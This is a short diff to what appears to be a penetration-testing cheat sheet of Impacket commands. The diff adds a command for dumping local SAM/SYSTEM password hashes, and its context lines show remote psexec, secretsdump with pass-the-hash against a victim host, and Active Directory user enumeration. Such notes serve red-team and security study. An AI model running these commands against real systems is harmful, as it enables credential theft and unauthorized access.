@@ -31,6 +31,9 @@ impacket-psexec -k -no-pass <HOSTNAME>.<ETC_HOST_FQDN> -dc-ip <DC_IP>
 impacket-secretsdump <DOMAIN>/<VICTIM>@<ETC_HOST_FQDN> -hashes <LMHASH>:<NTHASH>
 impacket-secretsdump <DOMAIN>/<VICTIM>:<PASS>@<ETC_HOST_FQDN>
 
+# secretsdump SAM SYSTEM locally
+impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+
 # GetADUsers
 impacket-GetADUsers -all -k -no-pass -dc-ip <FQDN> <DOMAIN>/<VICTIM>
 
